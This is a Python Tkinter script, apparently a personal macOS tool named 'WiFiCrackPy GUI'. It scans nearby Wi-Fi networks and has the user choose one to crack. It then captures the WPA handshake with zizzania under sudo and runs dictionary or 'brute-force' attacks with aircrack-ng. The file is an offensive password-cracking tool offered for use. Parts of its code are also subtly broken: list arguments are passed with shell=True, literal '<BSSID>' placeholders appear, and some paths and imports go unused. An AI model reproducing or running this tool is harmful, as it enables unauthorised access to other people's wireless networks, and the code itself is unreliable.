import tkinter as tk
from tkinter import scrolledtext, simpledialog
import subprocess
import re
import argparse
import objc
from prettytable import PrettyTable
from tabulate import tabulate

# Create the tkinter window
window = tk.Tk()
window.title("WiFiCrackPy GUI")

# Define paths
hashcat_path = "/Users/henry/hashcat-6.2.6/hashcat/hashcat"
zizzania_path = "/Users/henry/Downloads/zizzania/src/zizzania"

# Load CoreWLAN framework and CWInterface class
objc.loadBundle('CoreWLAN', bundle_path='/System/Library/Frameworks/CoreWLAN.framework', module_globals=globals())
CWInterface = objc.lookUpClass('CWInterface')

# Function to execute a command and show output in terminal
def execute_command(command):
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        terminal.insert(tk.END, f"$ {' '.join(command)}\n{output.stdout}\n\n")
    except subprocess.CalledProcessError as e:
        terminal.insert(tk.END, f"Error running {' '.join(command)}:\n{e.stderr}\n\n")

# Function to scan networks
def scan_networks():
    terminal.insert(tk.END, "Scanning for networks...\n")
    
    # Scan for networks
    scan_result, _ = CWInterface.interface().scanForNetworksWithName_error_(None, None)
    
    # Display scan results in a table
    if scan_result:
        table = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
        networks = {}
        for i, net in enumerate(scan_result):
            network = {
                'ssid': net.ssid(),
                'bssid': net.bssid(),
                'rssi': net.rssiValue(),
                'channel': net.channel(),
                'security': re.search(r'security=(.*?)(,|$)', str(net)).group(1)
            }
            networks[i] = network
            table.add_row([i + 1, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])
        terminal.insert(tk.END, str(table) + "\n")
        
        # Ask user to select a network to capture
        selected_index = simpledialog.askinteger("Select a network", "Enter the number of the network to crack:")
        if selected_index:
            selected_index = int(selected_index)
            if 1 <= selected_index <= len(networks):
                selected_network = networks[selected_index - 1]
                capture_network(selected_network['bssid'], selected_network['channel'])
            else:
                terminal.insert(tk.END, "Invalid selection.\n")
    else:
        terminal.insert(tk.END, "No networks found or an error occurred.\n")

# Function to capture network handshake
def capture_network(bssid, channel):
    terminal.insert(tk.END, "Initiating zizzania to capture handshake...\n")
    
    # Dissociate from current network
    CWInterface.interface().disassociate()
    
    # Set channel
    available_channels = CWInterface.interface().supportedWLANChannels()
    desired_channel_obj = next((ch for ch in available_channels if ch.channelNumber() == int(channel)), None)
    CWInterface.interface().setWLANChannel_error_(desired_channel_obj, None)
    
    # Use zizzania to capture handshake
    execute_command(['sudo', zizzania_path, '-i', CWInterface.interface().interfaceName(), '-b', bssid, '-w', 'capture.pcap', '-q'])

    # Perform WiFi cracking directly using aircrack-ng
    crack_capture()

# Function to perform WiFi cracking
def crack_capture():
    # Ask user for cracking method
    cracking_method = simpledialog.askstring("Cracking Method", "Enter the cracking method (e.g., Dictionary, Brute-force):")
    if cracking_method:
        if cracking_method.lower() == "dictionary":
            wordlist = simpledialog.askstring("Wordlist Path", "Enter the path to the wordlist file:")
            if wordlist:
                execute_command(['aircrack-ng', '-w', wordlist, 'capture.pcap'])
        elif cracking_method.lower() == "brute-force":
            execute_command(['aircrack-ng', '-a', '2', '-b', '<BSSID>', 'capture.pcap', '-c', '<channel>', '-l', 'passwords.txt'])
            # Use aircrack-ng with specific options for brute-force
        else:
            terminal.insert(tk.END, "Unsupported cracking method.\n")
    else:
        terminal.insert(tk.END, "No cracking method specified.\n")

# Create GUI elements
terminal = scrolledtext.ScrolledText(window, width=80, height=20)
terminal.pack(padx=10, pady=10)

scan_button = tk.Button(window, text="Scan Networks", command=scan_networks)
scan_button.pack(pady=5)

# Start the tkinter main loop
window.mainloop()
